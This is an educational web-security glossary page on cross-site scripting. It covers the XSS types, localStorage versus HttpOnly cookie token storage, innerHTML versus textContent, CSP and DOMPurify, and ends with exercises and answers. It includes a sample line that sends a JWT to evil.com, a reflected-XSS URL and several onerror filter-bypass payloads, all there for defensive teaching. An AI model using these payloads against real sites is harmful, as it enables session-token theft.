# XSS (Cross-Site Scripting)

> **Level 4 — Security & Authentication**
> Injected script stealing tokens; why you never store JWT carelessly.

---

## 1. Prerequisites
- [JWT (JSON Web Tokens)](./jwt.md) — The token format commonly stored on clients.
- [Cookies](../level_09/cookies.md) — The browser storage mechanism that can be secured using HttpOnly.

---

## 2. Term Category
- **Security**

---

## 3. Environment Context
- **Browser-Specific**: Vulnerabilities exist in the browser DOM rendering layer and client storage.

---

## 4. Explanation

### (1) Design Motivation — "Why did we design this?"
If an attacker can execute their own malicious JavaScript code inside a user's browser tab on your domain, they gain full control over that session. They can capture keystrokes, modify the page UI to display fake forms, and read any credentials stored in the browser's memory.

This script injection exploit is called **Cross-Site Scripting (XSS)**.

---

### (2) Types of XSS

- **Stored XSS:** The malicious script is permanently stored on the database (e.g. in a comment section). Every time other users visit the page, the database loads the script, and their browsers execute it.
- **Reflected XSS:** The script is passed as a URL query parameter (e.g. `https://myapi.com/search?q=<script>steal()</script>`). If the server prints the search query directly back into the page HTML without escaping it, the script runs immediately.
- **DOM-based XSS:** The vulnerability exists entirely in client-side JavaScript (e.g. reading a URL fragment and passing it directly to `element.innerHTML` without sanitization).

---

### (3) The Storage Security Dilemma: LocalStorage vs. HttpOnly Cookies
Where should you store access tokens (like JWTs) to keep them safe from XSS?

#### 1. Web Storage (`localStorage` / `sessionStorage`)
- **Behavior:** Accessible by any client-side JavaScript running on the origin.
- **XSS Risk:** **Extremely High**. If your site has an XSS vulnerability, an injected script can extract your JWT in a single line of code:
  ```javascript
  // Stolen in milliseconds by hacker script:
  const token = localStorage.getItem('jwt');
  fetch(`https://evil.com/steal?token=${token}`);
  ```

#### 2. HttpOnly Cookies
- **Behavior:** The browser attaches the cookie automatically to requests but blocks client-side JavaScript from accessing it.
- **XSS Risk:** **Protected**. Even if an attacker executes an XSS script on your page, calling `document.cookie` returns empty. The script cannot steal the cookie payload directly.

---

### (4) Reality Metaphor
Imagine your office has a directory containing a confidential contract.
- Storing a token in **`localStorage`** is like leaving the **folder open on top of your desk**. Anyone who walks into your office (including a disguised spy—the **injected script**) can look down, copy the contents, and walk out.
- Storing a token in an **`HttpOnly` Cookie** is like locking the folder inside a **wall drop-box**. You can drop letters in, and the courier handles delivery automatically. However, nobody inside the office (even you, or the spy) has the key to open the box and read the contract.
- **Input Sanitization** is like a **security guard** scanning everyone at the door, making sure they do not bring dangerous packages (like script tags) into the office.

---

### (5) Vulnerability Code Example (DOM-based XSS)

#### Unsafe: Using `innerHTML`
```javascript
const nameParam = new URLSearchParams(window.location.search).get('name');
// If nameParam is "<img src=x onerror='alert(1)'>", the script runs!
document.getElementById('greeting').innerHTML = `Hello, ${nameParam}`; 
```

#### Safe: Using `textContent`
```javascript
const nameParam = new URLSearchParams(window.location.search).get('name');
// Safely renders "<img src=x...>" as plain text rather than executing it.
document.getElementById('greeting').textContent = `Hello, ${nameParam}`; 
```

---

## 5. Common Mistakes & Pitfalls

### Mistake 1: Relying on input sanitization alone

**The mistake:** Assuming that because you strip out `<script>` tags from database inputs, your application is completely immune to XSS.

**Why it's wrong:** Attackers have dozens of creative ways to inject scripts without using standard `<script>` tags—for example, attaching handlers to invalid images (`<img src="x" onerror="alert(1)">`) or exploiting attributes in stylesheets.

*Fix:* Implement a strict **Content Security Policy (CSP)** HTTP header. A CSP tells the browser exactly which domains are allowed to load scripts and blocks inline script execution completely.

---

### Mistake 2: Injecting Un-Sanitized User Input directly into DOM via `innerHTML`

**The mistake:** Rendering user comment strings using `element.innerHTML = userInput`.

**Why it's wrong:** `innerHTML` executes raw HTML tags and embedded `<script>` tags, allowing attackers to inject malicious script code that steals session tokens and user data.

*Incorrect:*
```javascript
// Vulnerable DOM injection
div.innerHTML = `<p>${userComment}</p>`; // ❌ Executes embedded <script> tags!
```

*Fix:*
```javascript
// Safe text content assignment
div.textContent = userComment; // Escapes all HTML markup automatically
```

---

### Mistake 3: Relying on Blacklist String Matching for Input Sanitization

**The mistake:** Attempting to prevent XSS by stripping `<script>` tags using regex replace.

**Why it's wrong:** Attackers bypass simple string blacklists using event handlers (`<img src=x onerror=alert(1)>`), SVG vectors, or double encoding. Use HTML sanitizer libraries (DOMPurify).

*Incorrect:*
```javascript
const clean = input.replace(/<script>/gi, ''); // ❌ Bypassed by <img src=x onerror=...>!
```

*Fix:*
```javascript
const clean = DOMPurify.sanitize(input); // Robust HTML sanitization
```


---

## 6. Practice Exercises

### Exercise 1: Storage Auditor

**Problem:** Match the token storage location with its vulnerability profile:

1. Stored in standard `document.cookie` string.
2. Stored in an `HttpOnly`, `Secure` cookie.
3. Stored in `localStorage`.

**Vulnerability options:**
- **A.** Vulnerable to XSS theft; immune to CSRF.
- **B.** Vulnerable to XSS theft; vulnerable to CSRF.
- **C.** Immune to XSS theft; vulnerable to CSRF (requires SameSite mitigation).

> [!check]- Answer
> - 1. **B** (Standard cookies are readable by JS and attached automatically).
> - 2. **C** (HttpOnly blocks JS reading/XSS, but automatic transport remains open to CSRF).
> - 3. **A** (JS readable/XSS vulnerable, but no automatic attachment/CSRF immune).


---

### Exercise 2: Stored vs Reflected XSS Comparison

**Problem:** Distinguish Stored XSS vs Reflected XSS.

**Expected output:**
> [!check]- Answer
> ```text
> Stored XSS saves malicious scripts permanently in the database (affecting all viewers); Reflected XSS reflects script payloads instantly from URL parameters in a single response.
> ```
> ```text
> Stored XSS -> Saved in DB (e.g. comment field), executes for all users who view page.
> Reflected XSS -> Injected via URL parameter, executes only when victim clicks link.
> ```
> - **Explanation:** Stored XSS poses persistent systemic threat; Reflected XSS targets specific link clicks.
---

### Exercise 3: Content Security Policy (CSP) Header

**Problem:** Which HTTP response header restricts inline script execution to mitigate XSS attacks?

**Expected output:**
> [!check]- Answer
> ```text
> Content-Security-Policy: default-src 'self'
> ```
> ```http
> Content-Security-Policy: default-src 'self'; script-src 'self'
> ```
> - **Explanation:** CSP headers restrict script execution sources to trusted domains.
---

## 7. Related Terms
- [CSRF (Cross-Site Request Forgery)](./csrf.md) — The complementary session-riding exploit.
- [localStorage & sessionStorage](../level_09/web_storage.md) — The client-side Web Storage APIs vulnerable to XSS theft.

---

## 8. Key Takeaways
- XSS occurs when an attacker successfully injects and runs malicious JavaScript inside a user's browser tab.
- Stored XSS resides in databases; Reflected XSS rides on URLs; DOM XSS exists in client rendering.
- Any token stored in localStorage is vulnerable to theft via XSS.
- Storing tokens in `HttpOnly` cookies blocks client-side JS from reading them, securing them from XSS theft.
- Defend against XSS by using `textContent` instead of `innerHTML`, sanitizing inputs, and enforcing Content Security Policies (CSP).
